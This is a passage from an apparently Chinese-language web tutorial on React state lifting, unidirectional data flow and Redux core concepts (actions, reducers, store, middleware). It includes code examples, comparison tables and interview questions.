onChange(Number(e.target.value))&#125;</span><br><span class="language-xml">    /&gt;</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单向数据流（Unidirectional-Data-Flow）"><a href="#单向数据流（Unidirectional-Data-Flow）" class="headerlink" title="单向数据流（Unidirectional Data Flow）"></a>单向数据流（Unidirectional Data Flow）</h3><p><strong>核心原则</strong></p><pre class="mermaid">graph LR  A[State] --> B[UI]  B --> C[Actions]  C --> D[State Changes]  D --> A</pre><p><strong>React 中的实现</strong></p><pre class="mermaid">graph TD  P[父组件State] -->|Props| C1[子组件A]  P -->|Props| C2[子组件B]  C1 -->|回调函数| P  C2 -->|回调函数| P</pre><p><strong>与双向绑定的对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">单向数据流</th><th align="left">双向绑定</th></tr></thead><tbody><tr><td align="left">数据方向</td><td align="left">父→子</td><td align="left">父⇄子</td></tr><tr><td align="left">状态管理</td><td align="left">集中管理</td><td align="left">分散管理</td></tr><tr><td align="left">数据可预测性</td><td align="left">高</td><td align="left">低</td></tr><tr><td align="left">调试难度</td><td align="left">相对容易</td><td align="left">相对复杂</td></tr><tr><td align="left">典型框架</td><td align="left">React</td><td align="left">Vue&#x2F;Angular</td></tr></tbody></table><h3 id="状态提升的局限性"><a href="#状态提升的局限性" class="headerlink" title="状态提升的局限性"></a>状态提升的局限性</h3><ul><li>组件树层级过深时（超过3层）</li><li>非直系组件需要通信（如堂兄弟组件）</li><li>跨路由组件状态共享</li></ul><h3 id="现代状态管理方案基础"><a href="#现代状态管理方案基础" class="headerlink" title="现代状态管理方案基础"></a>现代状态管理方案基础</h3><p><strong>Flux 架构思想</strong></p><pre class="mermaid">graph LR  A[Action] --> B[Dispatcher]  B --> C[Store]  C --> D[View]  D --> A</pre><p><strong>状态提升 vs Redux</strong></p><table><thead><tr><th align="left">特性</th><th align="left">状态提升</th><th align="left">Redux</th></tr></thead><tbody><tr><td align="left">状态存储</td><td align="left">组件 state</td><td align="left">独立 store</td></tr><tr><td align="left">状态更新</td><td align="left">setState</td><td align="left">dispatch(action)</td></tr><tr><td align="left">更新逻辑</td><td align="left">在组件内</td><td align="left">reducer 纯函数</td></tr><tr><td align="left">状态共享范围</td><td align="left">父组件及子组件</td><td align="left">全局可访问</td></tr><tr><td align="left">中间件支持</td><td align="left">无</td><td align="left">支持异步操作</td></tr></tbody></table><h3 id="最佳实践总结-1"><a href="#最佳实践总结-1" class="headerlink" title="最佳实践总结"></a>最佳实践总结</h3><ol><li>最小状态原则：只提升必要共享的状态</li><li>保持状态局部：非共享状态保持在组件内部</li><li>避免过度提升：超过3层传递考虑 Context</li><li>数据不可变：状态更新时创建新对象</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 错误</span><br>formData.<span class="hljs-property">items</span>.<span class="hljs-title function_">push</span>(newItem);<br><span class="hljs-title function_">setFormData</span>(formData);<br><br><span class="hljs-comment">// ✅ 正确</span><br><span class="hljs-title function_">setFormData</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123;<br>  ...prev,<br>  <span class="hljs-attr">items</span>: [...prev.<span class="hljs-property">items</span>, newItem]<br>&#125;));<br></code></pre></td></tr></table></figure><ol start="5"><li>回调函数命名：统一使用 on{Event} 格式</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">Button</span> onSave=&#123;handleSave&#125; /&gt;<br></code></pre></td></tr></table></figure><h2 id="5-2-Redux-核心概念（Store、Action、Reducer）"><a href="#5-2-Redux-核心概念（Store、Action、Reducer）" class="headerlink" title="5.2 Redux 核心概念（Store、Action、Reducer）"></a>5.2 Redux 核心概念（Store、Action、Reducer）</h2><h3 id="Redux-三大核心概念全景图"><a href="#Redux-三大核心概念全景图" class="headerlink" title="Redux 三大核心概念全景图"></a>Redux 三大核心概念全景图</h3><pre class="mermaid">graph LR  A[Action] -->|描述事件| B[Reducer]  B -->|处理事件| C[Store]  C -->|提供状态| D[View]  D -->|触发| A</pre><h3 id="Action：状态变化的描述"><a href="#Action：状态变化的描述" class="headerlink" title="Action：状态变化的描述"></a>Action：状态变化的描述</h3><p><strong>本质与结构</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 基本结构</span><br><span class="hljs-keyword">const</span> action = &#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>,      <span class="hljs-comment">// 必需：动作类型</span><br>  <span class="hljs-attr">payload</span>: <span class="hljs-string">&#x27;Learn Redux&#x27;</span> <span class="hljs-comment">// 可选：携带数据</span><br>&#125;<br><br><span class="hljs-comment">// Flux Standard Action (FSA) 规范</span><br>&#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_USER_SUCCESS&#x27;</span>,<br>  <span class="hljs-attr">payload</span>: &#123; <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span> &#125;, <span class="hljs-comment">// 成功数据</span><br>  <span class="hljs-attr">error</span>: <span class="hljs-literal">false</span>,                     <span class="hljs-comment">// 是否错误</span><br>  <span class="hljs-attr">meta</span>: &#123; <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &#125;    <span class="hljs-comment">// 元信息</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Action 创建函数（Action Creators）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 同步 Action</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addTodo</span>(<span class="hljs-params">text</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>,<br>    <span class="hljs-attr">payload</span>: text<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 异步 Action (需中间件支持)</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params">id</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> dispatch =&gt; &#123;<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_USER_REQUEST&#x27;</span> &#125;);<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getUser</span>(id);<br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_USER_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: user &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_USER_FAILURE&#x27;</span>, error &#125;);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Reducer：状态转换的纯函数"><a href="#Reducer：状态转换的纯函数" class="headerlink" title="Reducer：状态转换的纯函数"></a>Reducer：状态转换的纯函数</h3><p><strong>核心特征</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">todosReducer</span>(<span class="hljs-params">state = [], action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>:<br>      <span class="hljs-comment">// ✅ 正确：返回新对象</span><br>      <span class="hljs-keyword">return</span> [...state, &#123; <span class="hljs-attr">text</span>: action.<span class="hljs-property">payload</span>, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> &#125;];<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;TOGGLE_TODO&#x27;</span>:<br>      <span class="hljs-comment">// ✅ 正确：使用map创建新数组</span><br>      <span class="hljs-keyword">return</span> state.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">todo, index</span>) =&gt;</span> <br>        index === action.<span class="hljs-property">index</span> <br>          ? &#123; ...todo, <span class="hljs-attr">completed</span>: !todo.<span class="hljs-property">completed</span> &#125;<br>          : todo<br>      );<br>      <br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-comment">// ⚠️ 必须：返回当前state</span><br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>不可变更新模式</strong></p><table><thead><tr><th align="left">操作</th><th align="left">错误方式</th><th align="left">正确方式</th></tr></thead><tbody><tr><td align="left">添加项</td><td align="left">state.push(item)</td><td align="left">[…state, item]</td></tr><tr><td align="left">删除项</td><td align="left">state.splice(index, 1)</td><td align="left">state.filter((_, i) &#x3D;&gt; i !&#x3D;&#x3D; index)</td></tr><tr><td align="left">更新对象属性</td><td align="left">state[prop] &#x3D; value</td><td align="left">{ …state, [prop]: value }</td></tr><tr><td align="left">嵌套对象更新</td><td align="left">state.a.b &#x3D; value</td><td align="left">{ …state, a: { …state.a, b: value } }</td></tr></tbody></table><p><strong>Reducer 拆分与组合</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 根Reducer</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">rootReducer</span>(<span class="hljs-params">state = &#123;&#125;, action</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">todos</span>: <span class="hljs-title function_">todosReducer</span>(state.<span class="hljs-property">todos</span>, action),<br>    <span class="hljs-attr">visibilityFilter</span>: <span class="hljs-title function_">filterReducer</span>(state.<span class="hljs-property">visibilityFilter</span>, action)<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用 combineReducers 简化</span><br><span class="hljs-keyword">import</span> &#123; combineReducers &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux&#x27;</span>;<br><span class="hljs-keyword">const</span> rootReducer = <span class="hljs-title function_">combineReducers</span>(&#123;<br>  <span class="hljs-attr">todos</span>: todosReducer,<br>  <span class="hljs-attr">visibilityFilter</span>: filterReducer<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="Store：应用状态的容器"><a href="#Store：应用状态的容器" class="headerlink" title="Store：应用状态的容器"></a>Store：应用状态的容器</h3><p><strong>核心职责</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; createStore &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux&#x27;</span>;<br><br><span class="hljs-comment">// 创建Store</span><br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(rootReducer, initialState);<br><br><span class="hljs-comment">// 主要API</span><br>store.<span class="hljs-title function_">dispatch</span>(action);  <span class="hljs-comment">// 触发状态更新</span><br>store.<span class="hljs-title function_">getState</span>();        <span class="hljs-comment">// 获取当前状态</span><br>store.<span class="hljs-title function_">subscribe</span>(listener); <span class="hljs-comment">// 监听状态变化</span><br><br><span class="hljs-comment">// 使用示例</span><br>store.<span class="hljs-title function_">subscribe</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;新状态:&#x27;</span>, store.<span class="hljs-title function_">getState</span>());<br>&#125;);<br><br>store.<span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">addTodo</span>(<span class="hljs-string">&#x27;Learn Redux&#x27;</span>));<br></code></pre></td></tr></table></figure><p><strong>Store 工作流程</strong></p><pre class="mermaid">sequenceDiagram  participant View as 视图  participant Store as Store  participant Reducer as Reducer    View->>Store: dispatch(action)  Store->>Reducer: 当前state + action  Reducer->>Reducer: 计算新state  Reducer->>Store: 返回新state  Store->>View: 通知订阅者更新</pre><h3 id="Redux-三大原则"><a href="#Redux-三大原则" class="headerlink" title="Redux 三大原则"></a>Redux 三大原则</h3><p>(1) 单一数据源 (Single Source of Truth)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 整个应用只有一个Store</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(store.<span class="hljs-title function_">getState</span>());<br><span class="hljs-comment">/* 输出：</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">  todos: [],</span><br><span class="hljs-comment">  visibilityFilter: &#x27;SHOW_ALL&#x27;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>(2) 状态只读 (State is Read-Only)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 禁止直接修改</span><br>store.<span class="hljs-title function_">getState</span>().<span class="hljs-property">todos</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;Illegal mutation!&#x27;</span>);<br><br><span class="hljs-comment">// ✅ 唯一修改方式：dispatch(action)</span><br>store.<span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">&#x27;Legal update&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>(3) 纯函数修改 (Changes with Pure Functions)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Reducer必须是纯函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">impureReducer</span>(<span class="hljs-params">state = <span class="hljs-number">0</span>, action</span>) &#123;<br>  <span class="hljs-comment">// ❌ 错误：包含副作用</span><br>  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;state&#x27;</span>, state); <br>  <br>  <span class="hljs-comment">// ❌ 错误：不纯（依赖外部变量）</span><br>  <span class="hljs-keyword">return</span> state + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>(); <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Redux-数据流完整周期"><a href="#Redux-数据流完整周期" class="headerlink" title="Redux 数据流完整周期"></a>Redux 数据流完整周期</h3><pre class="mermaid">sequenceDiagram  participant View as 视图  participant Action as Action  participant Middleware as 中间件  participant Store as Store  participant Reducer as Reducer    View->>Action: 用户交互触发  Action->>Middleware: 处理异步/副作用  Middleware->>Store: dispatch(action)  Store->>Reducer: (currentState, action)  Reducer->>Store: 返回newState  Store->>View: 通知订阅者  View->>View: 使用新状态重渲染</pre><h3 id="高频面试题与破解方案-12"><a href="#高频面试题与破解方案-12" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：为什么Redux要求Reducer是纯函数？</strong></p><ol><li>可预测性：相同输入必定得到相同输出</li><li>时间旅行：支持状态快照和回滚</li><li>易于测试：无需模拟环境，直接测试输入输出</li><li>性能优化：可安全进行浅比较</li></ol><p><strong>Q：Redux如何实现时间旅行调试？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 核心原理</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createStore</span>(<span class="hljs-params">reducer</span>) &#123;<br>  <span class="hljs-keyword">let</span> state = initialState;<br>  <span class="hljs-keyword">const</span> listeners = [];<br>  <span class="hljs-keyword">const</span> history = []; <span class="hljs-comment">// ⭐ 历史状态记录</span><br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">dispatch</span>: <span class="hljs-function">(<span class="hljs-params">action</span>) =&gt;</span> &#123;<br>      history.<span class="hljs-title function_">push</span>(state); <span class="hljs-comment">// 保存当前状态</span><br>      state = <span class="hljs-title function_">reducer</span>(state, action); <span class="hljs-comment">// 计算新状态</span><br>      listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> <span class="hljs-title function_">listener</span>());<br>    &#125;,<br>    <span class="hljs-attr">getState</span>: <span class="hljs-function">() =&gt;</span> state,<br>    <span class="hljs-attr">undo</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (history.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        state = history.<span class="hljs-title function_">pop</span>(); <span class="hljs-comment">// 恢复历史状态</span><br>        listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> <span class="hljs-title function_">listener</span>());<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 实际使用redux-undo库</span><br><span class="hljs-keyword">import</span> undoable <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux-undo&#x27;</span>;<br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(<span class="hljs-title function_">undoable</span>(rootReducer));<br></code></pre></td></tr></table></figure><p><strong>Q：Redux与Flux架构有何区别？</strong></p><table><thead><tr><th align="left">特性</th><th align="left">Redux</th><th align="left">Flux</th></tr></thead><tbody><tr><td align="left">Store数量</td><td align="left">单一Store</td><td align="left">多个Store</td></tr><tr><td align="left">Dispatcher</td><td align="left">无独立Dispatcher</td><td align="left">有中央Dispatcher</td></tr><tr><td align="left">状态更新</td><td align="left">纯函数Reducer</td><td align="left">Store内方法更新</td></tr><tr><td align="left">样板代码</td><td align="left">相对较少</td><td align="left">相对较多</td></tr><tr><td align="left">时间旅行</td><td align="left">原生支持</td><td align="left">需要额外实现</td></tr></tbody></table><h3 id="Redux-在函数组件中的使用"><a href="#Redux-在函数组件中的使用" class="headerlink" title="Redux 在函数组件中的使用"></a>Redux 在函数组件中的使用</h3><p><strong>基础连接方式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Provider</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-comment">// 根组件包裹Provider</span><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Provider</span> <span class="hljs-attr">store</span>=<span class="hljs-string">&#123;store&#125;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Provider</span>&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br><br><span class="hljs-comment">// 子组件连接</span><br><span class="hljs-keyword">import</span> &#123; connect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoList</span>(<span class="hljs-params">&#123; todos, dispatch &#125;</span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">connect</span>(<br>  <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> (&#123; <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span> &#125;), <span class="hljs-comment">// mapStateToProps</span><br>  <span class="hljs-function"><span class="hljs-params">dispatch</span> =&gt;</span> (&#123; dispatch &#125;)         <span class="hljs-comment">// mapDispatchToProps</span><br>)(<span class="hljs-title class_">TodoList</span>);<br></code></pre></td></tr></table></figure><p><strong>Hooks API（推荐）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useSelector, useDispatch &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 获取状态</span><br>  <span class="hljs-keyword">const</span> todos = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">todos</span>);<br>  <br>  <span class="hljs-comment">// 获取dispatch函数</span><br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">addTodo</span> = text =&gt; <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>, text &#125;);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">      &#123;todos.map(todo =&gt; <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;todo.id&#125;</span>&gt;</span>&#123;todo.text&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>)&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Redux-中间件机制"><a href="#Redux-中间件机制" class="headerlink" title="Redux 中间件机制"></a>Redux 中间件机制</h3><p><strong>中间件原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 中间件签名</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">middleware</span> = store =&gt; <span class="hljs-function"><span class="hljs-params">next</span> =&gt;</span> <span class="hljs-function"><span class="hljs-params">action</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 处理前逻辑</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;dispatching&#x27;</span>, action);<br>  <br>  <span class="hljs-comment">// 调用下一个中间件</span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">next</span>(action);<br>  <br>  <span class="hljs-comment">// 处理后逻辑</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;next state&#x27;</span>, store.<span class="hljs-title function_">getState</span>());<br>  <span class="hljs-keyword">return</span> result;<br>&#125;;<br><br><span class="hljs-comment">// 创建支持中间件的store</span><br><span class="hljs-keyword">import</span> &#123; applyMiddleware, createStore &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux&#x27;</span>;<br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(<br>  rootReducer,<br>  <span class="hljs-title function_">applyMiddleware</span>(middleware1, middleware2)<br>);<br></code></pre></td></tr></table></figure><p><strong>常用中间件</strong></p><table><thead><tr><th align="left">中间件</th><th align="left">解决的核心问题</th><th align="left">典型使用场景</th></tr></thead><tbody><tr><td align="left">redux-thunk</td><td align="left">异步Action处理</td><td align="left">简单API请求</td></tr><tr><td align="left">redux-saga</td><td align="left">复杂异步流程管理</td><td align="left">多步骤异步、竞态处理</td></tr><tr><td align="left">redux-observable</td><td align="left">响应式编程</td><td align="left">复杂事件流处理</td></tr><tr><td align="left">redux-logger</td><td align="left">状态变更日志</td><td align="left">开发环境调试</td></tr></tbody></table><h3 id="Redux-最佳实践"><a href="#Redux-最佳实践" class="headerlink" title="Redux 最佳实践"></a>Redux 最佳实践</h3><p><strong>项目结构组织</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">src/<br>  ├── store/           <span class="hljs-comment"># Redux相关</span><br>  │   ├── actions/     <span class="hljs-comment"># Action创建函数</span><br>  │   ├── reducers/    <span class="hljs-comment"># Reducer函数</span><br>  │   ├── sagas/       <span class="hljs-comment"># Saga中间件</span><br>  │   └── store.js     <span class="hljs-comment"># Store配置</span><br>  │<br>  ├── components/      <span class="hljs-comment"># 展示组件</span><br>  └── containers/      <span class="hljs-comment"># 容器组件</span><br></code></pre></td></tr></table></figure><p><strong>命名规范</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Action类型：&lt;名词&gt;_&lt;动词&gt;</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable 